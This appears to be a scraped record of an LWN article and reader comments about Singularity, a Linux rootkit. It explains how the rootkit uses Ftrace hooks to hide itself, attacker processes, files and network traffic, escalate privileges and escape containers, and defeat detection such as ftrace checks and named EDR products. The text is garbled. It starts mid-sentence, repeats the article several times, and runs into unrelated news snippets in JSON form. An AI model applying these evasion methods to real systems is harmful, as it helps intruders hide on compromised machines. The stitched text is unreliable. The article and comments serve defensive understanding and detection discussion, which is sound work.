system\nhasn't been modified at all. It uses the kernel's existingFtrace mechanismto\nhook into the functions that handle many system calls and change their responses\nto hide any sign of its presence. Nobody covers the Linux kernel like LWN; be in the know witha one-month trial subscription, no credit card needed.Using Ftrace offers several advantages to the rootkit; most importantly, it\nmeans that the rootkit doesn't need to change\nthe CPU trap-handling vector for system calls,\nwhich was one of the ways that some rootkits have been identified historically.\nIt also avoids having to patch the kernel's functions directly — kernel functions\nalready have hooks for Ftrace, so the rootkit doesn't need to perform its own\nad-hoc modifications to the kernel's machine code, which might be detected. The\nFtrace mechanism can be disabled at run time, of course — so Singularity helpfully enables\nit automatically and blocks any attempts to turn it off.Singularity is concerned with hiding four classes of things: its own presence,\nthe existence of attacker-controlled processes, network communication with those\nprocesses, and the files that those processes use. Hiding its own presence is\nactually fairly straightforward: when the kernel module is loaded, it resets the\nkernel'staint markerand removes itself from the list of active kernel\nmodules. This also means that Singularity cannot be unloaded, since it doesn't\nappear in the normal interfaces that are used for unloading kernel modules. It\nalso blocks the loading of subsequent kernel modules (although they will appear\nto load — they'll just silently fail).\nConsequently, Alves recommends experimenting with Singularity in a virtual machine.Hiding processesHiding processes, on the other hand, is more complicated. The mechanism that\nSingularity uses starts\nby identifying and remembering which processes are supposed to be hidden.\nSingularity uses a single 32-entry array of process IDs to track\nattacker-controlled processes; this is because a more sophisticated data\nstructure would introduce more opportunities for the rootkit to be caught,\neither by adding additional memory allocations that could be noticed, or by\nintroducing delays whenever one of its hooked functions needs to check the list\nof hidden process IDs.Singularity supports two ways to add processes to the list: by sending an unused\nsignal, or by setting a special environment variable and launching a new process. To implement the former, it hooks thekill()system call to detect an unused signal (number 59, by default),\nquashes the signal, adds the target process to its internal list, and gives the process\nroot permissions in the global namespace. This means that attacker-controlled\nprocesses can be added from inside containers, and automatically escape the\ncontainer using their new root privileges. To handle the environment variable, theexecve()system call is\nhooked in a similar way.Once a process is in the list, attempts to send signal 0 (to check whether the\nprocess exists) are also intercepted, as are other system calls that could\nrefer to the process, such asgetpgid(),sched_getaffinity(),\nand others. The total number of processes on the system, as reported bysysinfo()is also decremented to keep things consistent.\nThe process's files in/procare hidden by Singularity's file-hiding code. That code is probably the\ntrickiest part of the whole rootkit. The basic idea is to filter out hidden\ndirectory entries such that the filesystem appears to remain in a consistent\nstate, but filesystem code is difficult to get right at the best of times.Hiding filesWhen a program callsgetdents(), the kernel fills the provided buffer\nwith directory entries as normal. Then, Singularity's hook copies the buffer\nback from user memory, removes the hidden entries, puts the modified buffer back\nin user memory, and changes the return value\nof the system call to reflect the smaller number of directory entries returned.\nThis slightly complicated process is because the kernel doesn't provide a good\nplace for Singularity to inject a hook before the directory entries are\nwritten to user memory the first time. So, one potential way to identify the\nrootkit is to have another thread race with the attempt to read directory\nentries, trying to spot any that were removed.Changing the number of returned directory entries alone would make the system\nappear to be in an inconsistent state, however. Directories in Linux filesystems are supposed\nto track the number of references to them; this includes the \"..\" references\ninside child directories. So, when hiding a directory, Singularity also needs to\nintercept calls tostat()in order to adjust the number of visible links to its\nparent directory.Direct access to hidden directories, in the form ofopenat()and\nrelated system calls, is also made to fail.readlink()poses a special\nchallenge because it resolves symbolic links without actually opening them; it\nhas to be handled separately. In addition to the procfs files of hidden\nprocesses, Singularity also hides any directories matching a set of\nuser-supplied patterns. By default, it hides things named \"singularity\", but the\nproject's documentation suggests changing this in the build configuration,\nsince otherwise detecting the rootkit becomes straightforward.Despite this sophisticated file-hiding machinery, Singularity doesn't help\nagainst forensic examinations of a hard disk from another computer. If it isn't\ninstalled in the running kernel, it can't hide anything. Therefore, the\ndocumentation also recommends putting as many hidden files as possible onto\ntemporary filesystems stored in RAM, so that they don't show up after the system\nis rebooted.Another problem for the rootkit is files that contain traces of its presence,\nbut that would raise eyebrows if they disappeared entirely. This includes things\nlike the system log, but also files in procfs likekallsymsorenabled_functionsthat\nexpose which kernel functions have had Ftrace probes attached. For those files,\nSingularity doesn't hide them at the filesystem level, but it does filter calls\ntoread()to hide incriminating information.Deciding which log lines are incriminating isn't a completely solved problem,\nthough. Right now, Singularity relies on matching a set of known strings. This\nis another place where users will have to customize the build to avoid simple\ndetection methods.Hiding network activityEven once an attacker's processes can hide themselves and their files, it is\nstill usually desirable to communicate information back to a command-and-control\nserver. Singularity will work to hide network connections using a specific TCP port\n(8081, by default), and hide packets sent to and from that port from packet\ncaptures. It supports both IPv4 and IPv6. Hiding the connections from tools likenetstatuses the same filesystem-hiding code as before. Hiding things\nfrom packet captures requires hooking into the kernel's\npacket-receiving code.On the other hand, this is another place where Singularity can't control the\nobservations of uncompromised computers: if one is running a network tap on\nanother computer, the packets to and from Singularity's hidden port will be\ntotally visible.The importance of compatibilitySingularity only supports x86 and x86_64, but it does support\nboth 64-bit and 32-bit system call interfaces. This is\nimportant, because otherwise a 32-bit application running on top of a 64-bit\nkernel could potentially see different results, which would be suspicious. To\navoid this, Singularity inserts all of the aforementioned Ftrace hooks\ntwice, once on the 32-bit system call and once on the 64-bit system call. A\ngeneric wrapper function converts from the 32-bit calling convention to the\n64-bit calling convention before forwarding to the actual implementation of the\nhook.Singularity has been tested on a variety of 6.x kernels, including some\nversions shipped by Ubuntu, CentOS Stream, Debian, and Fedora. Since the tool\nprimarily uses the Ftrace interface, it should be supported on most kernels —\nalthough since it interfaces with internal details of the kernel, there is\nalways the chance that an update will break things.The tool also comes bundled with a set of utility scripts for cleaning up\nevidence that it was installed in the first place. These include a script that\nmimics normal log-rotation behavior, except that it silently truncates the logs\nto hinder analysis; a script that securely shreds a source-code checkout in case\nthe module was compiled locally; and a script that automatically configures the\nrootkit's module to be loaded on boot.Overall, Singularity is remarkably sneaky. If someone didn't know what to look\nfor, they would probably have trouble identifying that anything was amiss. The\nrootkit's biggest tell is probably the way that it prevents Ftrace from being\ndisabled; if one writes \"0\" to/proc/sys/kernel/ftrace_enabledand the\ncontent of the file remains \"1\", that's a pretty clear sign that something is\ngoing on.Readers interested in fixing that limitation are welcome to submit a\npull request to the project; Alves is interested in receiving bug fixes,\nsuggestions for new evasion techniques, and reports of working detection\nmethods. The code itself is simple and modular, so it is relatively easy to\nadapt Singularity for one's own purposes. Perhaps having such a vivid\ndemonstration of what is possible to do with a rootkit will inspire new, better\ndetection or prevention methods.to post commentsStealth or anti-debug?Posted Jan 16, 2026 18:29 UTC (Fri)\n                               bytux3(subscriber, #101245)\n                              [Link] (3 responses)This is nice. Unfortunately, I won't be able to daily drive this rootkit, as it doesn't seem compatible with DKMS!Slightly more seriously, I'm a little surprised that it blocks modules and eBPF as an anti-detection feature. On one hand, some sort of antivirus might be able to find the suspicious hooks by loading a module or filter.But it looks like the init_module hook just returns -ENOEXEC, that's bound to raise some alarms, too.If the EDR calls home to the admin dashboard and says it failed to talk to its module, the user's device can fail some enterprise posture compliance thing and the machine won't be allowed to log in to the VPN or corporate SSO.Or for desktop users, you will have a black screen after loading nvidia.ko... and actually you probably wouldn't suspect anything. Never mind, the stealth works in this case.Stealth or anti-debug?Posted Jan 16, 2026 23:15 UTC (Fri)\n                               bynotriddle(subscriber, #130608)\n                              [Link]They won't actually detect that the rootkit is present. So what? They're still going to reimage the machine, and then your payload won't be running any more.Stealth or anti-debug?Posted Jan 17, 2026 6:05 UTC (Sat)\n                               bywtarreau(subscriber, #51152)\n                              [Link]I was thinking the same, some modules are loaded late after some manual operations (e.g. tun, loop etc) and seeing them fail when trying to mount an image or start a VPN would trigger deeper investigation trying to figure what's wrong with that machine.Also, I was thinking that the code that deals with FS operation might have a tough work detecting accesses it needs to hide, and I suspect that such functions might be visible in \"perf top\" during heavy I/O. It's not to say that it would reveal it to the unsuspecting user, but those aware of these names might recognize the pattern.In any case it's really nice to provide such a playground to demonstrate what can really happen and that intrusions are not science fiction.Stealth or anti-debug?Posted Jan 17, 2026 22:39 UTC (Sat)\n                               bymatheuz(subscriber, #181907)\n                              [Link]The hook in finit and init_module that returns -ENOEXEC is temporary. It exists only to block LKRG. However, a new feature will be committed to GitHub in the coming days or possibly within a week, which will bypass LKRG for privilege escalation.Another point is that previously there was only a hook on finit and init_module to prevent other rootkit scanners that look for gaps in kernel memory from detecting it. In practice, they still fail to detect it. Even so, I will further improve module hiding using a technique that also avoids detection by LKM-based rootkit scanners.The blocking of new modules is temporary, and this hook will be removed soon. The same applies to blocking certain eBPF operations. This is also temporary. Once I have more time to work on Singularity, eBPF operations that attempt to detect hidden processes or files will be bypassed as well.That said, there will no longer be any behavioral changes related to these two modules.Additionally, Singularity can bypass EDRs such as CrowdStrike Falcon, which is eBPF-based, Trend Micro EDR, which is LKM-based, Kaspersky, also LKM-based, Elastic Security (there is an article in the Singularity README explaining how to bypass it), and some other EDRs that I tested in my virtual machine.ftrace_enabledPosted Jan 16, 2026 21:22 UTC (Fri)\n                               bydud225(subscriber, #114210)\n                              [Link] (3 responses)if one writes \"0\" to /proc/sys/kernel/ftrace_enabled and the content of the file remains \"1\", that's a pretty clear sign that something is going on.Naive suggestion : why not leveraging the same technique than for hidden files by catching read and write calls to that file and returning modified results?ftrace_enabledPosted Jan 16, 2026 22:52 UTC (Fri)\n                               bydaroc(editor, #160859)\n                              [Link]I don't see any reason why that wouldn't work; the project does accept pull requests, if you feel so inclined. You'd probably also need to intercept ftrace calls to make sure one can't add a new hook when ftrace is \"disabled\".ftrace_enabledPosted Jan 17, 2026 22:39 UTC (Sat)\n                               bymatheuz(subscriber, #181907)\n                              [Link]The claim that writing 0 to /proc/sys/kernel/ftrace_enabled while still reading 1 is a clear indicator of tampering is technically incorrect in this case. In Singularity, writes to /proc/sys/kernel/ftrace_enabled are explicitly intercepted, and the value provided by the user is stored and consistently reflected back on subsequent reads. As a result, there is no visible mismatch between what is written and what is read, and the file never unexpectedly returns 1 after writing 0.This mechanism implements a fake disable of ftrace. From user space, ftrace appears to be properly disabled, since reading ftrace_enabled returns the expected value and no abnormal behavior is observed. Internally, however, ftrace remains fully operational. The internal state is determined by the intercepted write and tracked via internal flags, rather than relying on the real kernel ftrace toggle.Additionally, when ftrace is in this fake-disabled state, access to tracing interfaces such as trace, trace_pipe, enabled_functions, and touched_functions is carefully controlled. Reads from trace return only static header information and no new events, while reads from trace_pipe block indefinitely without emitting trace data. This behavior closely matches that of a legitimately disabled ftrace subsystem and prevents the leakage of partial or suspicious output.As a result, common detection techniques that rely on inconsistencies in ftrace_enabled, or on monitoring trace and trace_pipe for unexpected activity, are ineffective. The overall behavior remains coherent and indistinguishable from a normal ftrace disable operation, despite ftrace continuing to function internally.ftrace_enabledPosted Jan 18, 2026 4:35 UTC (Sun)\n                               byalison(subscriber, #63752)\n                              [Link]A related question is, what happens if an investigator tries to use ftrace for debugging?   Does regular ftrace still work?  A lot of us would turn to ftrace early in any attempt to understand anomalies.Another common test would be to check open ports on the host from a remote with nmap.   That test would inevitably show that port 8081 is open.Might dissidents also find Singularity valuable?Posted Jan 18, 2026 4:49 UTC (Sun)\n                               byalison(subscriber, #63752)\n                              [Link]Reading about Singularity's hiding on the filesystem reminds me of Benetech's Martus project:https://martus.org/overview.htmlIn other words, might this sneaky rootkit be repurposed into a system which helps journalists and dissidents with life-or-death secrets to hide to conceal them on their system?   Most of the needed pieces appear to be present, although a Martus-like system should also report the total storage capacity to be smaller than the actual amount.   A security system for dissidents and journalists could reuse many of the components, but allow the user to deploy and control them.Spectacularly bad choice of namePosted Jan 20, 2026 2:38 UTC (Tue)\n                               byScienceMan(subscriber, #122508)\n                              [Link] (2 responses)The collision of naming withhttps://en.wikipedia.org/wiki/Singularity_(software) is unfortunate.Spectacularly bad choice of namePosted Jan 20, 2026 4:06 UTC (Tue)\n                               byedgewood(subscriber, #1123)\n                              [Link] (1 responses)From that link, \"In 2021 the community of Singularity open source project voted to rename itself to Apptainer.\"So it seems like it gave up that name? In general I'm not sympathetic to projects that pick English words for the project name complaining when another project uses the same English word, but in this case the original project explicitly gave it up.Spectacularly bad choice of namePosted Jan 20, 2026 13:39 UTC (Tue)\n                               byleromarinvit(subscriber, #56850)\n                              [Link]When I opened that Wikipedia link, I expected it to be about yet another piece of software named Singularity:https://en.wikipedia.org/wiki/Singularity_(operating_system)Hiding networkPosted Jan 20, 2026 12:58 UTC (Tue)\n                               byclaudex(subscriber, #92510)\n                              [Link]If I understand correctly, this will also hide legitimate network traffic and can be detected that way. If I runtcpdump -ni any port 8081and runnc -v 3fff::1 8081, in parallel  I won't see the traffic. Nobody covers the Linux kernel like LWN; be in the know witha one-month trial subscription, no credit card needed.Using Ftrace offers several advantages to the rootkit; most importantly, it\nmeans that the rootkit doesn't need to change\nthe CPU trap-handling vector for system calls,\nwhich was one of the ways that some rootkits have been identified historically.\nIt also avoids having to patch the kernel's functions directly — kernel functions\nalready have hooks for Ftrace, so the rootkit doesn't need to perform its own\nad-hoc modifications to the kernel's machine code, which might be detected. The\nFtrace mechanism can be disabled at run time, of course — so Singularity helpfully enables\nit automatically and blocks any attempts to turn it off.Singularity is concerned with hiding four classes of things: its own presence,\nthe existence of attacker-controlled processes, network communication with those\nprocesses, and the files that those processes use. Hiding its own presence is\nactually fairly straightforward: when the kernel module is loaded, it resets the\nkernel'staint markerand removes itself from the list of active kernel\nmodules. This also means that Singularity cannot be unloaded, since it doesn't\nappear in the normal interfaces that are used for unloading kernel modules. It\nalso blocks the loading of subsequent kernel modules (although they will appear\nto load — they'll just silently fail).\nConsequently, Alves recommends experimenting with Singularity in a virtual machine.Hiding processesHiding processes, on the other hand, is more complicated. The mechanism that\nSingularity uses starts\nby identifying and remembering which processes are supposed to be hidden.\nSingularity uses a single 32-entry array of process IDs to track\nattacker-controlled processes; this is because a more sophisticated data\nstructure would introduce more opportunities for the rootkit to be caught,\neither by adding additional memory allocations that could be noticed, or by\nintroducing delays whenever one of its hooked functions needs to check the list\nof hidden process IDs.Singularity supports two ways to add processes to the list: by sending an unused\nsignal, or by setting a special environment variable and launching a new process. To implement the former, it hooks thekill()system call to detect an unused signal (number 59, by default),\nquashes the signal, adds the target process to its internal list, and gives the process\nroot permissions in the global namespace. This means that attacker-controlled\nprocesses can be added from inside containers, and automatically escape the\ncontainer using their new root privileges. To handle the environment variable, theexecve()system call is\nhooked in a similar way.Once a process is in the list, attempts to send signal 0 (to check whether the\nprocess exists) are also intercepted, as are other system calls that could\nrefer to the process, such asgetpgid(),sched_getaffinity(),\nand others. The total number of processes on the system, as reported bysysinfo()is also decremented to keep things consistent.\nThe process's files in/procare hidden by Singularity's file-hiding code. That code is probably the\ntrickiest part of the whole rootkit. The basic idea is to filter out hidden\ndirectory entries such that the filesystem appears to remain in a consistent\nstate, but filesystem code is difficult to get right at the best of times.Hiding filesWhen a program callsgetdents(), the kernel fills the provided buffer\nwith directory entries as normal. Then, Singularity's hook copies the buffer\nback from user memory, removes the hidden entries, puts the modified buffer back\nin user memory, and changes the return value\nof the system call to reflect the smaller number of directory entries returned.\nThis slightly complicated process is because the kernel doesn't provide a good\nplace for Singularity to inject a hook before the directory entries are\nwritten to user memory the first time. So, one potential way to identify the\nrootkit is to have another thread race with the attempt to read directory\nentries, trying to spot any that were removed.Changing the number of returned directory entries alone would make the system\nappear to be in an inconsistent state, however. Directories in Linux filesystems are supposed\nto track the number of references to them; this includes the \"..\" references\ninside child directories. So, when hiding a directory, Singularity also needs to\nintercept calls tostat()in order to adjust the number of visible links to its\nparent directory.Direct access to hidden directories, in the form ofopenat()and\nrelated system calls, is also made to fail.readlink()poses a special\nchallenge because it resolves symbolic links without actually opening them; it\nhas to be handled separately. In addition to the procfs files of hidden\nprocesses, Singularity also hides any directories matching a set of\nuser-supplied patterns. By default, it hides things named \"singularity\", but the\nproject's documentation suggests changing this in the build configuration,\nsince otherwise detecting the rootkit becomes straightforward.Despite this sophisticated file-hiding machinery, Singularity doesn't help\nagainst forensic examinations of a hard disk from another computer. If it isn't\ninstalled in the running kernel, it can't hide anything. Therefore, the\ndocumentation also recommends putting as many hidden files as possible onto\ntemporary filesystems stored in RAM, so that they don't show up after the system\nis rebooted.Another problem for the rootkit is files that contain traces of its presence,\nbut that would raise eyebrows if they disappeared entirely. This includes things\nlike the system log, but also files in procfs likekallsymsorenabled_functionsthat\nexpose which kernel functions have had Ftrace probes attached. For those files,\nSingularity doesn't hide them at the filesystem level, but it does filter calls\ntoread()to hide incriminating information.Deciding which log lines are incriminating isn't a completely solved problem,\nthough. Right now, Singularity relies on matching a set of known strings. This\nis another place where users will have to customize the build to avoid simple\ndetection methods.Hiding network activityEven once an attacker's processes can hide themselves and their files, it is\nstill usually desirable to communicate information back to a command-and-control\nserver. Singularity will work to hide network connections using a specific TCP port\n(8081, by default), and hide packets sent to and from that port from packet\ncaptures. It supports both IPv4 and IPv6. Hiding the connections from tools likenetstatuses the same filesystem-hiding code as before. Hiding things\nfrom packet captures requires hooking into the kernel's\npacket-receiving code.On the other hand, this is another place where Singularity can't control the\nobservations of uncompromised computers: if one is running a network tap on\nanother computer, the packets to and from Singularity's hidden port will be\ntotally visible.The importance of compatibilitySingularity only supports x86 and x86_64, but it does support\nboth 64-bit and 32-bit system call interfaces. This is\nimportant, because otherwise a 32-bit application running on top of a 64-bit\nkernel could potentially see different results, which would be suspicious. To\navoid this, Singularity inserts all of the aforementioned Ftrace hooks\ntwice, once on the 32-bit system call and once on the 64-bit system call. A\ngeneric wrapper function converts from the 32-bit calling convention to the\n64-bit calling convention before forwarding to the actual implementation of the\nhook.Singularity has been tested on a variety of 6.x kernels, including some\nversions shipped by Ubuntu, CentOS Stream, Debian, and Fedora. Since the tool\nprimarily uses the Ftrace interface, it should be supported on most kernels —\nalthough since it interfaces with internal details of the kernel, there is\nalways the chance that an update will break things.The tool also comes bundled with a set of utility scripts for cleaning up\nevidence that it was installed in the first place. These include a script that\nmimics normal log-rotation behavior, except that it silently truncates the logs\nto hinder analysis; a script that securely shreds a source-code checkout in case\nthe module was compiled locally; and a script that automatically configures the\nrootkit's module to be loaded on boot.Overall, Singularity is remarkably sneaky. If someone didn't know what to look\nfor, they would probably have trouble identifying that anything was amiss. The\nrootkit's biggest tell is probably the way that it prevents Ftrace from being\ndisabled; if one writes \"0\" to/proc/sys/kernel/ftrace_enabledand the\ncontent of the file remains \"1\", that's a pretty clear sign that something is\ngoing on.Readers interested in fixing that limitation are welcome to submit a\npull request to the project; Alves is interested in receiving bug fixes,\nsuggestions for new evasion techniques, and reports of working detection\nmethods. The code itself is simple and modular, so it is relatively easy to\nadapt Singularity for one's own purposes. Perhaps having such a vivid\ndemonstration of what is possible to do with a rootkit will inspire new, better\ndetection or prevention methods.to post commentsStealth or anti-debug?Posted Jan 16, 2026 18:29 UTC (Fri)\n                               bytux3(subscriber, #101245)\n                              [Link] (3 responses)This is nice. Unfortunately, I won't be able to daily drive this rootkit, as it doesn't seem compatible with DKMS!Slightly more seriously, I'm a little surprised that it blocks modules and eBPF as an anti-detection feature. On one hand, some sort of antivirus might be able to find the suspicious hooks by loading a module or filter.But it looks like the init_module hook just returns -ENOEXEC, that's bound to raise some alarms, too.If the EDR calls home to the admin dashboard and says it failed to talk to its module, the user's device can fail some enterprise posture compliance thing and the machine won't be allowed to log in to the VPN or corporate SSO.Or for desktop users, you will have a black screen after loading nvidia.ko... and actually you probably wouldn't suspect anything. Never mind, the stealth works in this case.Stealth or anti-debug?Posted Jan 16, 2026 23:15 UTC (Fri)\n                               bynotriddle(subscriber, #130608)\n                              [Link]They won't actually detect that the rootkit is present. So what? They're still going to reimage the machine, and then your payload won't be running any more.Stealth or anti-debug?Posted Jan 17, 2026 6:05 UTC (Sat)\n                               bywtarreau(subscriber, #51152)\n                              [Link]I was thinking the same, some modules are loaded late after some manual operations (e.g. tun, loop etc) and seeing them fail when trying to mount an image or start a VPN would trigger deeper investigation trying to figure what's wrong with that machine.Also, I was thinking that the code that deals with FS operation might have a tough work detecting accesses it needs to hide, and I suspect that such functions might be visible in \"perf top\" during heavy I/O. It's not to say that it would reveal it to the unsuspecting user, but those aware of these names might recognize the pattern.In any case it's really nice to provide such a playground to demonstrate what can really happen and that intrusions are not science fiction.Stealth or anti-debug?Posted Jan 17, 2026 22:39 UTC (Sat)\n                               bymatheuz(subscriber, #181907)\n                              [Link]The hook in finit and init_module that returns -ENOEXEC is temporary. It exists only to block LKRG. However, a new feature will be committed to GitHub in the coming days or possibly within a week, which will bypass LKRG for privilege escalation.Another point is that previously there was only a hook on finit and init_module to prevent other rootkit scanners that look for gaps in kernel memory from detecting it. In practice, they still fail to detect it. Even so, I will further improve module hiding using a technique that also avoids detection by LKM-based rootkit scanners.The blocking of new modules is temporary, and this hook will be removed soon. The same applies to blocking certain eBPF operations. This is also temporary. Once I have more time to work on Singularity, eBPF operations that attempt to detect hidden processes or files will be bypassed as well.That said, there will no longer be any behavioral changes related to these two modules.Additionally, Singularity can bypass EDRs such as CrowdStrike Falcon, which is eBPF-based, Trend Micro EDR, which is LKM-based, Kaspersky, also LKM-based, Elastic Security (there is an article in the Singularity README explaining how to bypass it), and some other EDRs that I tested in my virtual machine.ftrace_enabledPosted Jan 16, 2026 21:22 UTC (Fri)\n                               bydud225(subscriber, #114210)\n                              [Link] (3 responses)if one writes \"0\" to /proc/sys/kernel/ftrace_enabled and the content of the file remains \"1\", that's a pretty clear sign that something is going on.Naive suggestion : why not leveraging the same technique than for hidden files by catching read and write calls to that file and returning modified results?ftrace_enabledPosted Jan 16, 2026 22:52 UTC (Fri)\n                               bydaroc(editor, #160859)\n                              [Link]I don't see any reason why that wouldn't work; the project does accept pull requests, if you feel so inclined. You'd probably also need to intercept ftrace calls to make sure one can't add a new hook when ftrace is \"disabled\".ftrace_enabledPosted Jan 17, 2026 22:39 UTC (Sat)\n                               bymatheuz(subscriber, #181907)\n                              [Link]The claim that writing 0 to /proc/sys/kernel/ftrace_enabled while still reading 1 is a clear indicator of tampering is technically incorrect in this case. In Singularity, writes to /proc/sys/kernel/ftrace_enabled are explicitly intercepted, and the value provided by the user is stored and consistently reflected back on subsequent reads. As a result, there is no visible mismatch between what is written and what is read, and the file never unexpectedly returns 1 after writing 0.This mechanism implements a fake disable of ftrace. From user space, ftrace appears to be properly disabled, since reading ftrace_enabled returns the expected value and no abnormal behavior is observed. Internally, however, ftrace remains fully operational. The internal state is determined by the intercepted write and tracked via internal flags, rather than relying on the real kernel ftrace toggle.Additionally, when ftrace is in this fake-disabled state, access to tracing interfaces such as trace, trace_pipe, enabled_functions, and touched_functions is carefully controlled. Reads from trace return only static header information and no new events, while reads from trace_pipe block indefinitely without emitting trace data. This behavior closely matches that of a legitimately disabled ftrace subsystem and prevents the leakage of partial or suspicious output.As a result, common detection techniques that rely on inconsistencies in ftrace_enabled, or on monitoring trace and trace_pipe for unexpected activity, are ineffective. The overall behavior remains coherent and indistinguishable from a normal ftrace disable operation, despite ftrace continuing to function internally.ftrace_enabledPosted Jan 18, 2026 4:35 UTC (Sun)\n                               byalison(subscriber, #63752)\n                              [Link]A related question is, what happens if an investigator tries to use ftrace for debugging?   Does regular ftrace still work?  A lot of us would turn to ftrace early in any attempt to understand anomalies.Another common test would be to check open ports on the host from a remote with nmap.   That test would inevitably show that port 8081 is open.Might dissidents also find Singularity valuable?Posted Jan 18, 2026 4:49 UTC (Sun)\n                               byalison(subscriber, #63752)\n                              [Link]Reading about Singularity's hiding on the filesystem reminds me of Benetech's Martus project:https://martus.org/overview.htmlIn other words, might this sneaky rootkit be repurposed into a system which helps journalists and dissidents with life-or-death secrets to hide to conceal them on their system?   Most of the needed pieces appear to be present, although a Martus-like system should also report the total storage capacity to be smaller than the actual amount.   A security system for dissidents and journalists could reuse many of the components, but allow the user to deploy and control them.Spectacularly bad choice of namePosted Jan 20, 2026 2:38 UTC (Tue)\n                               byScienceMan(subscriber, #122508)\n                              [Link] (2 responses)The collision of naming withhttps://en.wikipedia.org/wiki/Singularity_(software) is unfortunate.Spectacularly bad choice of namePosted Jan 20, 2026 4:06 UTC (Tue)\n                               byedgewood(subscriber, #1123)\n                              [Link] (1 responses)From that link, \"In 2021 the community of Singularity open source project voted to rename itself to Apptainer.\"So it seems like it gave up that name? In general I'm not sympathetic to projects that pick English words for the project name complaining when another project uses the same English word, but in this case the original project explicitly gave it up.Spectacularly bad choice of namePosted Jan 20, 2026 13:39 UTC (Tue)\n                               byleromarinvit(subscriber, #56850)\n                              [Link]When I opened that Wikipedia link, I expected it to be about yet another piece of software named Singularity:https://en.wikipedia.org/wiki/Singularity_(operating_system)Hiding networkPosted Jan 20, 2026 12:58 UTC (Tue)\n                               byclaudex(subscriber, #92510)\n                              [Link]If I understand correctly, this will also hide legitimate network traffic and can be detected that way. If I runtcpdump -ni any port 8081and runnc -v 3fff::1 8081, in parallel  I won't see the traffic. Using Ftrace offers several advantages to the rootkit; most importantly, it\nmeans that the rootkit doesn't need to change\nthe CPU trap-handling vector for system calls,\nwhich was one of the ways that some rootkits have been identified historically.\nIt also avoids having to patch the kernel's functions directly — kernel functions\nalready have hooks for Ftrace, so the rootkit doesn't need to perform its own\nad-hoc modifications to the kernel's machine code, which might be detected. The\nFtrace mechanism can be disabled at run time, of course — so Singularity helpfully enables\nit automatically and blocks any attempts to turn it off. Singularity is concerned with hiding four classes of things: its own presence,\nthe existence of attacker-controlled processes, network communication with those\nprocesses, and the files that those processes use. Hiding its own presence is\nactually fairly straightforward: when the kernel module is loaded, it resets the\nkernel'staint markerand removes itself from the list of active kernel\nmodules. This also means that Singularity cannot be unloaded, since it doesn't\nappear in the normal interfaces that are used for unloading kernel modules. It\nalso blocks the loading of subsequent kernel modules (although they will appear\nto load — they'll just silently fail).\nConsequently, Alves recommends experimenting with Singularity in a virtual machine. Hiding processes, on the other hand, is more complicated. The mechanism that\nSingularity uses starts\nby identifying and remembering which processes are supposed to be hidden.\nSingularity uses a single 32-entry array of process IDs to track\nattacker-controlled processes; this is because a more sophisticated data\nstructure would introduce more opportunities for the rootkit to be caught,\neither by adding additional memory allocations that could be noticed, or by\nintroducing delays whenever one of its hooked functions needs to check the list\nof hidden process IDs. Singularity supports two ways to add processes to the list: by sending an unused\nsignal, or by setting a special environment variable and launching a new process. To implement the former, it hooks thekill()system call to detect an unused signal (number 59, by default),\nquashes the signal, adds the target process to its internal list, and gives the process\nroot permissions in the global namespace. This means that attacker-controlled\nprocesses can be added from inside containers, and automatically escape the\ncontainer using their new root privileges. To handle the environment variable, theexecve()system call is\nhooked in a similar way. Once a process is in the list, attempts to send signal 0 (to check whether the\nprocess exists) are also intercepted, as are other system calls that could\nrefer to the process, such asgetpgid(),sched_getaffinity(),\nand others. The total number of processes on the system, as reported bysysinfo()is also decremented to keep things consistent.\nThe process's files in/procare hidden by Singularity's file-hiding code. That code is probably the\ntrickiest part of the whole rootkit. The basic idea is to filter out hidden\ndirectory entries such that the filesystem appears to remain in a consistent\nstate, but filesystem code is difficult to get right at the best of times.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Breaking the Zimmermann Telegram (2018)", "url": "https://medium.com/lapsed-historian/breaking-the-zimmermann-telegram-b34ed1d73614", "content": "Breaking the Zimmermann Telegram (2018)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nuclear elements detected in West Philippine Sea", "url": "https://www.philstar.com/headlines/2026/01/18/2501750/nuclear-elements-detected-west-philippine-sea", "content": "Nuclear elements detected in West Philippine Sea. MANILA, Philippines — The University of the Philippines Marine Science Institute (UP MSI) has detected elevated levels of iodine-129 – an isotope commonly used as an indicator of nuclear activity – in seawater samples from the West Philippine Sea (WPS). UP MSI said the concentrations found in the WPS were higher than in any other part of the country, despite the Philippines having no active nuclear power plant or nuclear weapons program. The findings are based on an analysis of 119 seawater samples collected from the WPS, the Philippine Rise, the Sulu Sea and other areas across the archipelago. Researchers found iodine-129 levels in the WPS to be about 1.5 to 1.7 times higher than those recorded in other sampling sites. The study was conducted by experts from the Department of Science and Technology-Philippine Nuclear Research Institute, UP MSI’s Geological Oceanography Laboratory and the University of Tokyo. The team traced the likely source of the isotope to the Yellow Sea. UP MSI said the results were consistent with recent Chinese studies linking iodine-129 in the Yellow Sea to decades-old nuclear weapons tests and nuclear fuel reprocessing facilities in Europe, which released the isotope into soils and rivers in northeastern China. The study added that iodine-129 may have reached Philippine waters through ocean circulation systems, particularly the Yellow Sea Coastal Current and the Chinese Coastal Current, though further oceanographic modeling is needed to confirm the transport pathways. While iodine-129 is radioactive, the researchers said its current levels in the WPS pose no threat to human health or the environment. They also underscored the need to strengthen monitoring and regulation of radioactive materials, especially those that cross national boundaries.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "ClickHouse acquires Langfuse", "url": "https://langfuse.com/blog/joining-clickhouse", "content": "ClickHouse acquires Langfuse. Our goal continues to be building the best LLM engineering platform  ClickHouse has acquired Langfuse. If you’re reading this as a Langfuse user, your first question is probably:What does this mean for me? Our roadmap stays the same, our goal continues to be building the best LLM engineering platform, and we remain committed to open source and self-hosting. There are no immediate changes to how you use Langfuse and how you can reach out to us. Whatdoeschange is our ability to move faster. With ClickHouse behind us, we can invest more deeply into performance, reliability, and our roadmap that helps teams build and improve AI applications in production. This is the section we would want to read first, too. Joining Clickhouse compresses years of operational learning into immediate, real customer benefits. The longer version of how we got here is in ourhandbook. Langfuse started the same way many LLM products start: we were building agents ourselves. And we constantly ran into the same problems.", "source": "HackerNews", "date": null, "author": null, "score": null}
